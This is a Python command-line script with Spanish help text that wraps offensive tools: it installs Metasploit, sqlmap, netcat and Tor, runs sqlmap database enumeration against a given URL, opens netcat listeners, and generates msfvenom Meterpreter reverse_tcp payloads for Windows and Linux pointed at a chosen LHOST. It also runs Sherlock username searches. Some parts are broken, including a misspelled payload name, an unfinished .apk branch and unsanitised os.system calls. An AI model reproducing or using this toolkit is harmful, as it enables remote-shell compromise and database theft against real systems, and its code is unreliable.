import argparse, os, sys, webbrowser

def error():
    print('\n[*] Error: Revisa si has añadido todos los argumentos necesarios.\n')

parser = argparse.ArgumentParser()

parser.add_argument('--install', '-i',
                    required = False,
                    help = "Instala todos los requerimientos necesarios.")


parser.add_argument('--ayuda', '-a',
                    required = False,
                    help = "Muestra todos los comandos.")


parser.add_argument('--port', '-p',
                    required = False,
                    help = "Indicación del puerto en el que levantar el servidor.")

parser.add_argument('--target', '-t',
                    required = False,
                    help = "Especifica la IP para cualquier operación.")

parser.add_argument('--url', '-u',
                    required = False,
                    help = "Especifica el parámetro URL en la operación.")


parser.add_argument('--listen', '-l',
                    required = False,
                    help = "Se indica antes del parámetro PORT. Indica que se va a iniciar una escucha.")

parser.add_argument('--clone', '-c',
                    required = False,
                    help = "Puede acompañarse del parámetro URL para clonar repositorios de GitHub.")

parser.add_argument('--server', '-s',
                    required = False,
                    help = "Va acompañado del argumento PORT, indica que se va a levantar un servidor en Python.")

parser.add_argument('--name', '-n',
                    required = False,
                    help = "Especifica un nombre, normalmente va acompañado del parámetro -r para realizar una búsqueda con Sherlock.")

parser.add_argument('--research', '-r',
                    required = False,
                    help = "Va acompañado del parámetro NAME, se utiliza para realizar una búsqueda de usuarios con Sherlock.")

parser.add_argument('--venom', '-v',
                    required = False,
                    help = "Indica que se va a generar un payload con MsfVenom. Va acompañado de \"True\" o \"False\".")

parser.add_argument('--extension', '-e',
                    required = False,
                    help = "Especifica la extensión del un archivo, normalmente en las operaciones con MsfVenom.")

args = parser.parse_args()

if args.install:
    os.system("apt-get update && sudo apt-get install git -y && sudo apt-get install python3 && sudo apt-get install python3-pip && pip3 install argparse && sudo apt install -y tor torbrowser-launcher && sudo apt-get install wget gpg && wget -qO- https://packages.microsoft.com/keys/microsoft.asc | gpg --dearmor > packages.microsoft.gpg && sudo sh -c 'echo \"deb [arch=amd64,arm64,armhf signed-by=/etc/apt/keyrings/packages.microsoft.gpg] https://packages.microsoft.com/repos/code stable main\" > /etc/apt/sources.list.d/vscode.list' && rm -f packages.microsoft.gpg && sudo apt install apt-transport-https && sudo apt update && sudo apt install code && git clone --depth 1 https://www.github.com/sqlmapproyect/sqlmap.git sqlmap-dev && sudo apt get-install Netcat && sudo apt-get install metasploit-framework")
  
elif args.ayuda == 'True':
    webbrowser.open('https://www.github.com/ZombieGeek0/ReverseConnections')
    text = '''
[-i, --install]  (Instala todos los requerimientos necesarios)
[-a, --ayuda]  (Muesra todos los comandos)
[-p, --port]  (Especifica el puerto para cualquier operación)
[-t, --target]  (Especifica la IP para cualquier operación)
[-u, --url]  (Especifica el parámetro URL en la operación)
[-l, --listen]  (Se indica antes del parámetro PORT. Indica que se va a iniciar una escucha)
[-c, --clone]  (Puede acompañarse del parámetro URL para clonar repositorios de GitHub)
[-s, --server]  (Va acompañado del argumento PORT, indica que se va a levantar un servidor en Python)
[-n, --name]  (Especifica un nombre, normalmente va acompañado del parámetro -r para realizar una búsqueda con Sherlock)
[-r, --research]  (Va acompañado del parámetro NAME, se utiliza para realizar una búsqueda de usuarios con Sherlock)
[-v, --venom]  (Indica que se va a generar un payload con MsfVenom. Va acompañado de "True" o "False")
[-e, --extension]  (Especifica la extensión del un archivo, normalmente en las operaciones con MsfVenom)
'''
    print(text)

elif args.server == 'true':
    os.system(f'python -m SimpleHTTPServer {args.port}')

elif args.url:
    os.system(f'sqlmap -u "{args.url}" -dbs')

elif args.listen == 'true':
    os.system(f'nc -nlvp {args.port}')

elif args.clone == 'true':
    os.system(f'git clone {args.url}')

elif args.research == 'true':
    os.system(f'git clone https://github.com/sherlock-project/sherlock && cd sherlock && cd sherlock && python3 sherlock.py {args.name}')

elif args.venom == 'true':

    if args.extension == '.exe':
        os.system(f'msfvenom -p widnows/meterpreter/reverse_tcp LHOST={args.target} LPORT={args.port} -f exe > {args.name}.exe')

    if args.extension == '.elf':
        os.system(f'msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={args.target} LPORT={args.port} -f elf > {args.name}.elf')

    if args.extension == '.apk':
        os.system('TERMINAR ESTO')

else:
    print('\n[*] Error: Revisa si has añadido todos los argumentos necesarios.\n')
